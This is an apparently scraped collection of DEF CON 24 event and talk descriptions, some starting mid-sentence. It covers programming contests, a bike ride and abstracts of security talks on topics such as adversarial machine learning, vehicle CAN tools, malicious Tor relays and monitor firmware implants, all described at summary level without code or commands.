It’s been 32 years since the invention of Core War, the ultimate programming game, and this year at DEF CON hackers from around the world will be submitting their programs to contend in a fight to the crash in cyberspace.\n\nFor those who don’t know, Core War is a game in which assembly language programs run on a simulated computer, competing to see which one can survive to the end. The DEF CON contest will be using a graphical MARS in order to create a more pleasant display for those watching. In order to create your own programs (which you can enter at any time up to the competition!), simply install PyGame for Python 2 (python2-pygame on most Unix systems) and download the MARS we will be using. (NOTE: This is subject to change; if you know of a MARS that has a graphical display and non-graphical simulation, and also runs on Linux, please inform me.)\n\nIf you have never played Core War before, never fear! It’s not difficult at all to learn, especially if you understand a little about assembly language programming already. Check out this tutorial to get started.\n\nEven if you are an experienced Core War player, please TEST your warriors on the MARS we are using before submitting them. Submissions that fail to parse will be rejected.\n\nWe will run two separate competitions, one on Friday and one on Saturday. Several practice rounds will occur each day before the official qualification, semifinals, and finals rounds. Hill rules and scheduling will be posted as the date approaches.",

And maybe, if we really try this time instead of goofing off and just finish our homework, we can wash away a few of our regrets. This year will see a return of the build-a-contraption two tiered format. Contestants can choose to bring a contraption and participate in the unlimited class or build one at the convention and compete in the hacked class. With *wonderful* prizes to the winners and the adulation of our hydrated fans, who wouldn't want to compete? Guaranteed to be a blast or your regrets back!

			"description": "So you think you can code, and want to try out for our crazy little contest. Awesome. Some things you need to know to get started:\n\nWhat is Crash and Compile?\n\nWhat happens when you take an ACM style programming contest, smash it head long into a drinking game, throw in a mix of our most distracting helpers, then shove the resulting chaos incarnate onto a stage? You get the contest known as Crash and Compile.\n\nDo you think you can code? Do you think you can code while drinking? We are looking for nine teams who think they have the smarts, the concentration, and the liver to hold up to our gauntlet of programming. Teams who can not only code, but do so with style. We set you against the clock and the other teams. And because they think watching people simply code is boring, our \"Team Distraction\" is has taken it upon themselves to be creative in hindering you from programming, much to the enjoyment of the audience. \n\nQualifications take place Friday afternoon in the contest area. Teams of one or two people. Be ready to code, as this won't be easy. The top nine teams who showed themselves ostentatious enough to take on our challenge will compete on the Contest Stage Saturday.\n\n\nAs much as it would be great to have more people competing, Crash and Compile only has space for nine teams during the main contest. It's highly competitive, and so we only the best move on to the coveted nine spots. But how do we know you are the best? That's where the qualification round comes in. In years past, this would happen prior to DEF CON. But as you can guess, many people had difficulty finding time to work on this on top of life and all the other things which happen just before DEF CON. To get more involvement, and give everyone a chance to try out Crash and Compile, last year we moved the qualification round to Friday during DEF CON, and this worked awesomely. We had more people try out for Crash and Compile than we had ever had. So we are doing the same this year.\n\n\nKey points:\n\n* Qualifications start on Friday at 12pm in the Contest Area.\n* Teams are up to two people.\n* We encourage you to try out, even if you don't think you could qualify. The problems are fun, and you learn something by doing. DEF CON is all about getting involved.\n* You will need your laptop setup with the development environment of your choice.\n* You can't compete if you can't code. Repeat, you need your laptop. If you worry about getting haxored by the evil defcons, then throw a distro of linux on a new drive, and you will be fine.\n* During the qualification round, use whatever method of getting to the internet as you would like, either via DEF CON's wireless network, your hotel room, cellular modem, AOL dial up, etc..\n* During the contest if you qualify, network access is wired via the DEF CON network. Means you are isolated from the wireless, but you do need a network interface (looking at you Mac users)\n* During qualifications you get two hours to complete the sample problems. Didn't finish, not a big deal, we're looking on how well you did, and what you've submitted. We announce who made it to the main contest later that evening, as well as any alternate teams, should someone have to bail.\n* The contest runs on the main stage in the contest area. It consists of several rounds, as you accumulate points for problems completed, beers drank, and perhaps even style points (awarded for particular badassery)\n\n\nHow problems work:\n\nYou get a problem description, sample input and sample output. You have to write a program that can, based on the problem description, read in the sample input, and output the sample output. Simple right?\n\nInterface to the contest is web based. The program input is generated randomly, and you get five minutes to download the sample input, run it through your program, and then upload the sample output, as well as a copy of your source code. Don't make it in five minutes, you can try again. We do present you with a simple \"Hello World\" test case to make sure you are set before starting the timed portion.\n\n\nWe hope to see you there.",

You do not need to go there ahead of time.\n \nDust off your cycling shorts, get out the chammois butter, ice the water, it’s almost time for another Defcon Bike Ride in Las Vegas!\n\nThe date of this years bike ride is Friday, Aug 5, 2016 at 6am. This is Friday of Defcon. We will meet outside [TBD location] at 5:30am. There [may/will] also be a contingent meeting at the Tuscany at 5:30 am.\n\nRegistration is here - https://docs.google.com/forms/d/13P8g-M7MDUO1qqarB0Nh1s5iF6si2zBIwa3PZZU5oTQ/viewform. This is just so we can get a count and arrange comms leading up to the event. It will also give us your email so we can blast out any details needed pre ride, or at 5:25am on Aug 5th :).\n\nHere’s the deal – we have partnered again with McGhies Bike Shop in Las Vegas for our ride. Yes – they will throw your clipless pedals and seat posts on if you insist. They have 3 levels of road bikes:  a ~$40 Cannondale Synapse,  and a ~$100 Lance Armstrong starter kit road bike (think Madone.)  There’s also a $125 level also.\n\nBike rental is first come first serve — there are about 18 $40 male road bikes and 5 female — after that it’s a hybrid or a $100 bike.  You can always ship out your bike for about $100 each way on most airlines.\n\nYou alone are solely responsible for your bike reservation. McGhies is aware that we are running this event and will support us, but it’s on you to make sure you are all set with a bike.\n\nThe route:\nNOTE: This ride may be at a higher altitude than you are used to. (2600-3800 ft)\nOK — last piece the route – you can see the route here - http://www.mapmyride.com/routes/view/40203606. This is the same route as last year (and the year before). Basically the route is slightly uphill out – and mostly downhill back. It’s looking like we’ll have a car heading up the back. (thanks @myrcurial ) There may be a bigger loop for those interested – we’ll let you know soon (basically taking the scenic loop around and catching up w/the group on your way back) – but it will likely be unofficial.\nWe are looking for sponsors so let us know if you are aware of anyone interested in throwing in some schwag or some cash to help support this ride.\n\nWhat do I do next?\nOnce you reserve your bike — all you have to do is wait for Defcon 24! Oh and keep riding!\n\nCheers!\nThe Cycle Override Team\n",

QUIC is an application-layer UDP-based protocol that multiplexes connections between endpoints at the application level, rather than the kernel level. HTTP/2 (H2) is a successor to SPDY, and multiplexes different HTTP streams within a single connection. More than 10% of the top 1 Million websites are already using some of these technologies, including much of the 10 highest traffic sites. Whether you multiplex out across connections with QUIC, or multiplex into fewer connections with HTTP/2, the world has changed. We have a strong sensation of Déjà vu with this work and our 2014 Black Hat USA MPTCP research. We find ourselves discussing a similar situation in new protocols with technology stacks evolving faster than ever before, and Network Security is largely unaware of the peril already upon it. This talk briefly introduces QUIC and HTTP/2, covers multiplexing attacks beyond MPTCP, discusses how you can use these techniques over QUIC and within HTTP/2, and discusses how to make sense of and defend against H2/QUIC traffic on your network. We will also demonstrate, and release, some tools with these techniques incorporated.\n\nCatherine (Kate) Pearce (Twitter: @secvalve) is a Senior Security Consultant for Cisco, who is based in Wellington, New Zealand.

We will describe data driven techniques to derive fingerprints for specific types of individual and subgroup behaviors. The goal of these methods is to add context to communications taking place within an enterprise as well as being able to identify when certain asset profiles change there behavioral fingerprint in such a way as to indicate compromise. The type of profiles we want to discover can be tied to human behavior (User Fingerprinting) or particular asset classes like WebServers or Databases (Hardware/Software Fingerprinting). Finally enriching these profiles with a small amount of network context lets us break down the behaviors across different parts of the network topology.\n\nThese techniques become important when we want to passively monitor for certain attacks against server hardware even without visibility into the local logs running on the server. For example we will cover the automated discovery and enrichment of DMZ assets and how we use these techniques to profile when a server has been planted with a Webshell or when an asset has been used to covertly exfil data. The methods we propose should be generic to apply to a wide variety of any kind of Layer 4/ Layer 7 traffic or just PCAP data alone.\n\nRod Soto (Twitter: @rodsoto) has over 15 years of experience in information technology and security.

			"description": "OMER ZOHAR, HEAD OF RESEARCH AT TOPSPIN SECURITY\nToday's networks are undergoing all sorts of sinister attacks from numerous sources and for myriad reasons. Security at the perimeter is inadequate for thwarting today's highly intelligent attacks as hackers routinely breach the perimeter and gain entry. It isn't long before the network is compromised and critical information is stolen. We must now assume that, despite significant investments in prevention, breaches are going to happen. An additional approach is required. Security teams must go on the offensive, creating a web of non-stop, real-time detection operations using multiple vectors against an ever-changing landscape of cyber threats. Deception technology now plays a critical role. Used as a strategy for many centuries in actual warfare, the concept of deception is becoming a significant weapon in network-protection schemes. Deception technology doesn't rely on known attack patterns and monitoring. Instead, it employs very advanced luring techniques to entice attackers away from valuable company assets and into pre-set traps, thus revealing their presence. It is able to detect threats in real time without relying on any signatures, heuristics or complex behavioral patterns. But how effective is a deception strategy in detecting breaches? What method works best? How does it integrate with current security operations already in place?\n\nIn this talk we will present findings from a first ever research which measured the efficiency of proactive deception using mini-traps and decoys in real-life threat scenarios. We have reconstructed a real enterprise environment complete with endpoints, servers, network traffic and data repositories as well as security tools such as IDS, firewall, SIEM etc. The deception layer was then integrated into the environment in 2 steps: (a) by placing decoys in the network and (b) by placing mini-traps on the assets which point to the decoys, set false credentials, trigger silent alarms and more. We then evaluated the effectiveness of the mini-traps and decoys against both automated, machine-based attacks as well as against sophisticated human attacks: The first stage involved checking the behavior of a variety of malware families against the environment and measuring the deception layer's success in detecting their activity. For the second phase, we invited red-team professionals and white hat hackers to employ real techniques and advanced tools with the task of moving laterally in the environment and exfiltrate high value data.\n\nOmer Zohar has over a decade of experience as a developer and researcher in the data security market. As head of Research for TopSpin Security he is responsible for the research of malware and post-breach detection methods and for defining advanced detection schemes.",

Millions are spent researching and studying your weaknesses. The attack vectors are subtle. Most times we don't realize that manipulation has occurred until it is too late. Fear not, we can harden our defenses. We can put safeguards in place to help avoid being the victim. For me, the answer came from an unlikely source: my daughter. Small children are fantastic. Society has not yet influenced their development; therefore, children are relentless in pursuing their aims. Since they are naive to right and wrong, they will use any tool available to get their goal. How does this help? My daughter became my trainer, and this talk discusses how interacting with her has improved my defenses. Comparing her strategies to real world examples will show how to build a training framework of your own. Access to small children is not needed.\n\nGrayRaven (Twitter: @_grayraven_) is a senior software engineer at Cisco Systems. He has been fascinated with manipulation since his childhood. Despite receiving a degree in psychology, he spent 18 years as a professional in the Information Technology space. GrayRaven spent the first seven years of his career as a system and network administrator before moving to the dark art of programming. Two years ago he stopped dabbling and tumbled down the security rabbit hole. This journey makes him believe that he is finally using his degree professionally.

With that theme in mind, the speaker researches the history of one large, government-funded infrastructure and compares it to another. Specifically, the Eisenhower Interstate System and the Internet. \"Connections: Eisenhower and the Internet\" explores what the logistical challenges of moving vehicles across the Country can teach us about cybersecurity. Although these two topics seem unrelated, the speaker will take the audience on a journey that begins with early 20th century road-building projects, travels through ARPANET and the commercialization of the Internet, and arrives at current-day cyberspace. These two massive infrastructures have changed the world, and there are important lessons that the former can teach about the latter. The presentation concludes with predictions about the future of the the Information Superhighway and how information security professionals can prepare.\n\nChef (Twitter: @damonsmall) earned his handle from his use of cooking metaphors to describe infosec concepts to laypeople. He began his career studying music at Louisiana State University and took advantage of computer skills learned in the LSU recording studio to become a systems administrator in the mid 1990s. Following the dotcom bust in the early 2000s, Chef began focusing on cyber security. This has remained his passion, and over the past 16 years as a security professional he has supported infosec initiatives in the healthcare, defense, and oil and gas industries. In addition to his Bachelor of Arts in Music, Chef completed the Master of Science in Information Assurance degree from Norwich University in 2005.

The technology has grown to be the most talked-about and least well-understood branch of machine learning. Aside from it's highly publicized victories in playing Go, numerous successful applications of deep learning in image and speech recognition has kickstarted movements to integrate it into critical fields like medical imaging and self-driving cars. [1] In the security field, deep learning has shown good experimental results in malware/anomaly detection, [2] APT protection, spam/phishing detection, and traffic identification. This DEF CON 101 session will guide the audience through the theory and motivations behind deep learning systems. First looking at the simplest form of supervised neural networks, then exploring how variations such as convolutional neural networks and recurrent neural networks can improve the efficacy of such systems, we demonstrate that most deep learning systems are not designed with security and resiliency in mind, and can be duped by any patient attacker with a good understanding of the system. [3] The efficacy of applications using machine learning should not only be measured with precision and recall, but also by their malleability in an adversarial setting. After diving into popular deep learning software, we show how it can be tampered with to do what you want it do, while avoiding detection by system administrators.\n\nBesides giving a technical demonstration of deep learning and its inherent shortcomings in an adversarial setting, we will focus on tampering real systems to show real weaknesses in critical systems built with it. In particular, this demo-driven session will be focused on manipulating an image recognition and speech recognition system built with deep learning at the core, and exploring the difficulties in attacking systems in the wild. By discussing defensive measures that should be put in place to prevent the class of attacks demonstrated, we hope to address the hype behind deep learning from the context of security, and look towards a more resilient future of the technology where developers can more safely use it in critical applications.\n\nClarence Chio graduated with a B.S. and M.S. in Computer Science from Stanford University, specializing in data mining and artificial intelligence. He currently works as a Research Data Engineer at Shape Security, a startup in Silicon Valley building a product that protects from malicious bots and automated attacks on Global 2000 customers. At Shape, he works on the big data analysis systems that are used to tackle this problem. Clarence spoke on Machine Learning and Security at PHDays 2015 in Moscow, BSides Las Vegas 2015, Code Blue Tokyo 2015, SecTor Toronto 2015, and BSides NYC 2016. He had been a community speaker with Intel, and is also the founder and organizer of the ‘Data Mining for Cyber Security’ meet-up group, the largest gathering of security data analysis professionals in the San Francisco Bay Area.",

CISSP, Chief Endpoint Security Architect\n\nAs a defender, have you ever been asked ‘do they win?’ How about ‘what products or capabilities should I buy to even the odds?’ Mapping the functionality to a standard list of desired capabilities only gets you so far. And, many vendors require an organization to pay for a framework, or for access to a framework, to enable tactical and strategic campaigns. Wouldn’t it be great to have an open source way to pick strategies? So what do you do? Build out your own defensive campaigns based on research, taxonomies and gameification. Building the attacker’s point of view is our expertise (at a CON). We have plenty of research here to talk about that point of view. How about building out the defender’s point of view based on the attacker’s life cycle? Defenders can use this as a defensive ‘compliment’ to begin a legitimate defensive campaign. Maybe the defender could even ‘gamify’ the approach? An attacker’s approach, a defender’s approach and a progressive life cycle with a defender’s set of targets built on things we all know, love and hate: project management. I think we have a game! \n\nBuild out rules, much like real life, then bring on the attackers, bring on the defenders and play a little game to educate, demonstrate and evangelize. Watch strategies played by both attackers and defenders. Switch sides and learn to be a Purple Teamer! Digitize it and watch the game play people or even play itself; the true rise of the machine.\n\nWanna Play?!\n\nShane began his professional career with a large food manufacturer where he helped build and secure SCADA/ICS systems across 90+ food manufacturing plants in the US. From there he spent 6 years helping to develop and build the functionality of a security team for a large pharmaceutical distributor. Currently, he is the Chief Endpoint Security Architect for a Fortune 50 technology company. His interests reside in cyber resiliency techniques, internet of things, building/breaking things and muscle cars. To think, his 25+ year passion for all things geeky started with hacking the school library computer and getting detention. Shane is also a licensed attorney. Please don't hold this against him.",

Are there any grown-ups in Washington DC watching over FBI or NSA as they decide what vulns to disclose to vendors and which to keep to themselves?

			"description": "Project CITL\nMudge Zatko Director, CITL\nSarah Zatko CHief Scientist, CITL\n\nMany industries, provide consumers with data about the quality, content, and cost of ownership of products, but the software industry leaves consumers with very little data to act upon. In fact when it comes to how secure or weak a product is from a security perspective, there is no meaningful consumer facing data. There has long been a call for the establishment of an independent organization to address this need. Last year, Mudge (from DARPA, Google, and L0pht fame) announced that after receiving a phone call from the White House he was leaving his senior position inside Google to create a non-profit organization to address this issue. This effort, known as CITL, is akin to Consumer Reports in its methodologies. While the media has dubbed it a “CyberUL”, there is no focus on certifications or seals of approval, and no opaque evaluation metrics. Rather, like Consumer Reports, the goal is to evaluate software according to metrics and measurements that allow quantitative comparison and evaluation by anyone from a layperson, CFO, to security expert. \n\nHow? A wide range of heuristics that attackers use to identify which targets are hard or soft against new exploitation has been codified, refined, and enhanced. Some of these techniques are quite straightforward and even broadly known, while others are esoteric tradecraft. To date, no one has applied all of these metrics uniformly across an entire software ecosystem before and shared the results. \n\nFor the first time, a peek at the Cyber Independent Testing Lab’s metrics, methodologies, and preliminary results from assessing the software quality and inherent vulnerability in over 100,000 binary applications on Windows, Linux, and OS X will be revealed. All accomplished with binaries only. Sometimes the more secure product is actually the cheaper, and quite often the security product is the most vulnerable.\n\nThere are plenty of surprises like these that are finally revealed through quantified measurements. With this information, organizations and consumers can finally make informed purchasing decisions when it comes the security of their products, and measurably realize more hardened environments. Insurance groups are already engaging CITL, as are organizations focused on consumer safety. Vendors will see how much better or worse their products are in comparison to their competitors. Even exploit developers have demonstrated that these results enable bug-bounty arbitrage. That recommendation you made to your family members last holiday about which web browser they should use to stay safe (or that large purchase you made for your industrial control systems)? Well, you can finally see if you chose a hard or soft target… with the data to back it up.\n\nMudge Zatko is the Director of CITL. He has contributed significantly to disclosure and education on information and security vulnerabilities. In addition to pioneering buffer overflow work, the security work he has released contained early examples of flaws in the following areas: code injection, race conditions, side-channel attacks, exploitation of embedded systems, and cryptanalysis of commercial systems. He was the original author of the password cracking software L0phtCrack, Anti-Sniff, and L0phtWatch. In 2010 Mudge accepted a position as a program manager at DARPA where he oversaw cyber security R&D, and re-built the Agency’s approach to cyber security research. In 2013 Mudge went to work for Google where he was the Deputy Director of their Advanced Technology & Projects division. Most recently, after conversations with the White House, Mudge stood up the non-profit Cyber Independent Testing Laboratory inspired by efforts such as Consumer’s Union. He is the recipient of the Secretary of Defense Exceptional Civilian Service Award medal, an honorary Plank Owner of the US Navy Destroyer DDG-85, was inducted into the Order of Thor, the US Army’s Association of Cyber Military Professionals, recognized as a vital contributor to the creation of the US Cyber Corps (SfS PDD-63), and has received other commendations from the CIA and from the Executive Office of the President of the United States\n\nSarah Zatko s the Chief Scientist at CITL, a partner at L0pht Holdings, LLC, and a member of the US Army’s Order of Thor. She has presented her research on the integration of security into CS curriculum at Shmoocon and Hope. That work is also published in IEEE Security & Privacy.

Instead of attempting to decompile code, we seek to undo the work of the linker and produce relocatable files, the typical output of a compiler. The main benefit of the later technique over the former being that it does work. Once achieved universal code ‘reuse’ by relinking those relocatable objects as arbitrary shared libraries, we'll create a form of binary reflection, add scripting capabilities and in memory debugging using a JIT compiler, to attain automated API prototyping and annotation, which, we will argue, constitutes a primary form of binary code self awareness. Finally, we'll see how abusing the dynamic linker internals shall elegantly solve a number of complex tasks for us, such as calling a given function within a binary without having to craft a valid input to reach it. \n\nThe applications in terms of vulnerability exploitation, functional testing, static analysis validation and more generally computer wizardry being tremendous, we'll have fun demoing some new exploits in real life applications, and commit public program profanity, such as turing PEs into ELFs, functional scripting of sshd in memory, stealing crypto routines without even disassembling them, among other things that were never supposed to work.

However, Tor remains a practical system with a variety of limitations, some of which were indeed exploited in the recent past. In particular, Tor's security relies on the fact that a substantial number of its nodes do not misbehave. \n\nPrevious work showed the existence of malicious participating Tor relays. For example, there are some Exit nodes that actively interfere with users' traffic and carry out man-in-the-middle attacks. In this work we expose another category of misbehaving Tor relays (HSDirs), that are integral to the functioning of the hidden services and the dark web. The HSDirs act as the DNS directory for the dark web. Because of their nature, detecting their malicious intent and behavior is much harder. We introduce, the concept of honey onions (honions), a framework to detect misbehaving Tor relays with HSDir capability. By setting up and deploying a large scale honion over Tor for more than 72 days, we are able to obtain lower bounds on misbehavior among HSDirs. \n\nWe propose algorithms to both estimate the number of snooping HSDirs and identify them, using optimization and feasibility techniques. Our experimental results indicate that during the period of our work at least 110 such nodes were snooping information about hidden services they host. We reveal that more than half of them were hosted on cloud infrastructure and delayed the use of the learned information to prevent easy traceback. Furthermore, we provide the geolocation map of the identified snooping Tor HSDirs\n\nGuevera Noubir holds a PhD in Computer Science from EPFL and is currently a Professor at Northeastern University.

It's like hooking without hookers.\n\nThe use cases for hooking code execution are abundant and this topic is very expansive. EhTracing (pronounced ATracing) is technique that allows monitoring/altering of code execution at a high rate with several distinct advantages.\n\nFull context (registers, stack & system state) hooking can be logged without needing to know a function prototype and changes to execution flow can be made as desired.\nTraditional detours like hooking requires a length disassembly engine than direct binary .text segment modifications to insert an intended hook (no changes to binary needed with EhTrace).\nBlock/Branch stepping enables a simplification of analysis code (does not need to do a full procedure/function graph recognition/traversal). This will feature focus on the use of VEH and the DR7 backdoor in x64 Windows.\nIn a nutshell, EhTrace enables very good performance, in proc debugging and a dead simple RoP hook primitive. Some neat graphics and visualizations will be made some of the early examples up at https://github.com/K2/EhTrace\n\nThis novel implementation for hookers establishes a model for small purpose built block-fighting primitives to be used in order to analyze & do battle, code vs. code. \n\nAs a special bonus “round 3 FIGHT!” we will see a hypervisor DoS that will cause a total lockup for most hypervisors (100%+ utilization per CORE). This goes to show that emulating or even adapting a hypervisor to a full CPU feature set is exceedingly hard and it’s unlikely that a sandbox/hypervisor/emulator will be a comprehensive solution to evade detection from adversarial code for some time.\n\nLet’s have some fun blockfighting with some loose boxed hookers!\n\nK2 likes to poke around at security cyber stuff, writing tools and exploits to get an understanding of what’s easy, hard and fun/profit!

Everyone wants to control vehicles and already knows that you can make the horn honk by replaying that frame you captured. But is this all that there is on this topic? Reversing OEM and third party tools, capturing firmware update files on the fly, and hijacking Security Sessions on a bus are just a few examples of things that can be done as well. For this and more, we will introduce to you the CanBadger! It's not just a logger, neither an injector. It's a reversing tool for vehicles that allows you to interact in realtime with individual components, scan a bus using several protocols (yup, UDS is not the only one) and perform a series of tests that no other tool offers. The CanBadger is where the real fun begins when dealing with a vehicle, and you can build it under $60USD! If you are already done with replaying frames on the CAN bus and want to learn how that fancy chip-tuning tool deals with your car, or simply want to get Security Access to your vehicle without caring about the security key or algorithm, we are waiting for you!\n\nJavier Vazquez Vidal is passionate about technology and specializes in hardware and embedded systems security. He studied Electromechanics and Telecommunications, developing a passion for electronics and technology since his youth. He has been part of several projects that involved well-known hardware, but his first public work was presented at DEF CON 21, the ECU tool. He developed the CHT, a tool to take over the CAN network, and had some fun with the ‘paella country’ smart meters. He is currently working as a Product Security Engineer at Code White GmbH, and has worked at companies such as Tesla, Daimler, Airbus Military and Visteon.\n\nFerdinand Noelscher is an information security researcher from Germany.

			"description": "411: A framework for managing security alerts\nKai Zhong Application Security Engineer, Etsy\nKenneth Lee Senior Security Engineer, Etsy\n\nModern web applications generate a ton of logs. Suites like ELK (Elasticsearch, Logstash, Kibana) exist to help manage these logs, and more people are turning to them for their log analysis needs. These logs contain a treasure trove of information regarding bad actors on your site, but surfacing that information in a timely manner can be difficult. When Etsy moved over from Splunk to ELK in mid-2014, we realized that ELK lacked necessary functionality for real-time alerting. We needed a solution that would provide a robust means of querying ELK and enrich the data with additional context. We ended up creating our own framework to give us this functionality. We’ve named this open-source framework 411. We designed 411 as a solution for detecting and alerting on interesting anomalies and security events. The Security team at Etsy was interested in using this functionality to detect everything from XSS to monitoring for potential account compromises. First, we’ll start off with a discussion of what you should be logging into Elasticsearch. This is important to help you create useful, actionable alerts in 411. We’ll note a number of configuration tips and tricks to help you get the most out of your ELK cluster. From there, we’ll dive into 411’s features and how it allows the Etsy security team to work effectively. We’ll conclude with two demos of 411 in action. This presentation will show you several examples of useful searches you can build in 411 and how this data can be manipulated to generate clear, actionable alerts. We’ll demonstrate the built-in workflow for responding to alerts and how 411 allows you to pull up additional context as you work on an alert. Additionally, while much of our discussion will be centered around ELK, 411 can in fact be used with a variety of data sources (Several of these sources are built into 411). Whether you’re a newbie looking to learn more or a security veteran with an established system, 411 will help change the way you handle security alerts.\n\nKai is a security engineer at Etsy.

In this presentation co-authored with Farsight Security Scientist Dr. Joe St Sauver, Farsight Security CEO Dr. Paul Vixie will scrutinize failed DNS queries (‘NXDOMAINs’), looking for the same ‘opportunities’ that a domainer or typo squatter would (although we will not be acting on that data by actually registering domains). \n\nDr. Vixie will discuss two primary types of behavior: 1) Volumetrically-driven typo-squatting, which Dr. Vixie will measure by computing the volume of NXDOMAINs seen by domain during a 24 hour period, and the time between popular typos appearing in NXDOMAINs and those same domains being registered and actually used, and 2) Domainers programmatically exploring permutations of domains around high value domains, probing for available domains and automatically registering the most promising probed domains discovered to still be available. Both of these hypothesized behaviors should be externally observable and thus able to be confirmed by watching a real-time stream of NXDOMAIN errors, and a real-time stream of newly observed, actually-registered domains, as available from the Security Information Exchange.\n\nDr. Paul Vixie will experimentally confirm these hypothesized relationships and describe examples of (1) the most commonly observed types of typographical errors, (2) the brands apparently most-targeted for squatting, (3) the distribution of delays from NXDOMAIN detection to observed domain use, (4) the potential relationship between NXDOMAIN volume thresholds and TLD cost. Dr. Vixie will also explain how this information illuminates opportunities for tackling these types of domain name abuse. Time will be reserved for Q&A.\n\nDr. Paul Vixie is the CEO and Co-founder of Farsight Security. He previously served as President, Chairman and Founder of Internet Systems Consortium (ISC), as President of MAPS, PAIX and MIBH, as CTO of Abovenet/MFN, and on the boards of several for-profit and non-profit companies. He served on the ARIN Board of Trustees from 2005 to 2013, as ARIN Chairman in 2008 and 2009, and was a founding member of ICANN Root Server System Advisory Committee (RSSAC) and ICANN Security and Stability Advisory Committee (SSAC). He operated the ISC's F-Root name server for many years, and is a member of Cogent's C-Root team. He is a sysadmin for Op-Sec-Trust. Dr. Vixie has been contributing to Internet protocols and UNIX systems as a protocol designer and software architect since 1980. He wrote Cron (for BSD and Linux), and is considered the primary author and technical architect of BIND 4.9 and BIND 8, and he hired many of the people who wrote BIND 9. He has authored or co-authored a dozen or so RFCs, mostly on DNS and related topics, and of Sendmail: Theory and Practice (Digital Press, 1994). His technical contributions include DNS Response Rate Limiting (RRL), DNS Response Policy Zones (RPZ), and Network Telemetry Capture (NCAP). He earned his Ph.D. from Keio University for work related to DNS and DNSSEC, and was named to the Internet Hall of Fame in 2014.\n\nTwitter: @paulvixie",

The FTC is the lead federal agency for protecting the privacy rights and data security of American consumers. In the last year, it brought several enforcement actions against companies for violating consumer privacy and data security and launched new initiatives – PrivacyCon, Start with Security, and a new Office of Technology Research and Investigation– to improve its capabilities and responsiveness to new threats to consumer privacy and security. But the FTC needs your help. Today it is announcing a call for research on specific topics in order to broaden its capabilities to protect consumers. Come learn about the policy responses to the rise of the machines, the FTC’s cases and research initiatives, and how you can help.\n\nTerrell McSweeny serves as a Commissioner of the Federal Trade Commission.

We may ask ourselves: what does smart mean? It is the possibility of building systems which are nodes of a more complex network, digitally connected to the internet and to the final users. Our cities are becoming one of those networks and over time more and more elements are getting connected to such network: from traffic lights to information signs, from traffic and surveillance cameras to transport systems.\n\nThis last element, also called as Smart Mobility is the subject of our analysis, divided in three sub-element, each one describing a different method of transport in our city: Private transport: for this method we analyze the smart alternatives aimed to make parking activity easy, hassle free and more convenient Shared transport: we focus our attention on those systems which are sharing transport vehicles. In particular we deal with bike sharing which seems to be the most wide spread system in European cities Public transport: object of our analysis for this section is the bus, metro and tram network The aim of our analysis is understanding the ecosystem which each element belongs to and performing a security evaluation of such system. In this way the most plausible attack and fraud scenarios are pointed out and the presence of proper security measures is checked.\n\nAll the details discussed here are collected from a sample city, but the same methodology and concept can be applied to most of the smart cities in the world.\n\nMatteo Beccaro is a security researcher, enrolled in Computer Engineering at Politecnico of Turin.

Previous research has demonstrated that SSDs do not always behave in an equivalent manner to magnetic hard drives, however, the scope of these differences and the conditions that lead to this behavior are still not well understood. This basic, undeniable anomaly regarding file storage and recovery begs one simple, yet critical question: can the data being mined for evidence be trusted?\n\nThis talk presents research on the forensic implications of SSDs from one of the most comprehensive studies to date. The goal of this study was to demonstrate and quantify differences across a sample pool of drives in an array of tests conducted in a controlled environment. These tests explored the variations between drive firmware, controllers, interfaces, operating systems, and TRIM state. \n\nFurther observations revealed that some drives behaved nearly identical to the control drive, while others showed that the prospects of recovering deleted data was significantly reduced. This presentation will demonstrate these differences and provide a framework to allow forensics investigators to determine the likelihood of successful deleted file recovery from an evidence bearing solid state drive.\n\nTom Kopchak is the Director of Technical Operations at Hurricane Labs, where he pretends to manage a team of network and system engineers, but is still an engineer and technology geek at heart.

But a failure mode that is often neglected is when a component continues to operate, but incorrectly. This can happen due to malicious intentional compromise, or simple hardware faults, misconfiguration, or bugs. Unfortunately, there is no single add-on to designs that will fix this case. This talk presents three very different systems and how they each handle resilience despite malicious participants. The problems, and the solutions, are very different. The important message of this talk is that there is no one solution, and that this case must be considered in designs.\n\nRadia Perlman is a Fellow at EMC. She has made many contributions to the fields of network routing and security protocols including robust and scalable network routing, spanning tree bridging, storage systems with assured delete, and distributed computation resilient to malicious participants.

OSD, or on-screen-display controllers are ubiquitous components in nearly all modern monitors. OSDs are typically used to generate simple menus on the monitor, allowing the user to change settings like brightness, contrast and input source. However, OSDs are effectively independent general-purpose computers that can: read the content of the screen, change arbitrary pixel values, and execute arbitrary code supplied through numerous control channels. We demonstrate multiple methods of loading and executing arbitrary code in a modern monitor and discuss the security implication of this novel attack vector. \n\nWe also present a thorough analysis of an OSD system used in common Dell monitors and discuss attack scenarios ranging from active screen content manipulation and screen content snooping to active data exfiltration using Funtenna-like techniques. We demonstrate a multi-stage monitor implant capable of loading arbitrary code and data encoded in specially crafted images and documents through active monitor snooping. This code infiltration technique can be implemented through a single pixel, or through subtle variations of a large number of pixels. We discuss a step-by-step walk-through of our hardware and software reverse-analysis process of the Dell monitor. We present three demonstrations of monitoring exploitation to show active screen snooping, active screen content manipulation and covert data exfiltration using Funtenna. \n\nLastly, we discuss realistic attack delivery mechanisms, show a prototype implementation of our attack using the USB Armory and outline potential attack mitigation options.

Granick Director of Civil Liberties, Stanford Center for Internet and Society\n\nIs the Internet going to live up to its promise as the greatest force for individual freedom that the world has ever known? Or is the hope for a global community of creative intellectual interaction lost…for now?\n\nIn last year’s Black Hat keynote—entitled “Lifecycle of a Revolution”—noted privacy and civil liberties advocate Jennifer Granick told the story of the Internet utopians, people who believed that Internet technology could greatly enhance creative and intellectual freedom. Granick argued that this Dream of Internet Freedom was dying, choked off by market and government forces of centralization, regulation, and globalization. The speech was extremely popular. Almost 8000 people watched it at Black Hat. It was retweeted, watched and read by tens of thousands of people. Boing Boing called it “the speech that won Black Hat (and DEF CON ).”\n\nThis year, Granick revisits the state of the Internet Dream. This year’s crypto war developments in the U.S. and U.K. show governments’ efforts to control the design of technologies to ensure surveillance. The developments also show that governments see app stores as a choke point for regulation and control, something that couldn’t easily happen with general purpose computers and laptops but which could be quite effective in a world where most people access the network with mobile devices.\n\nAlso in the past year, the European Court of Justice embraced blocking orders and ISP liability in the name of stopping copyright infringement, privacy violations, and unflattering comments from ever being published online. The effect of these developments is to force Internet companies to be global censors on the side of online civility against the free flow of information and opinion. If we want to realize some of the promise of the Internet utopian vision, we are going to have to make some hard political choices and redesign communications technology accordingly. The future could look a lot like TV, or we could work to ensure our technology enshrines individual liberties. This talk will help attendees join that effort.\n\nIn 1995, Jennifer Granick attended her first DEF CON at the Tropicana Hotel.

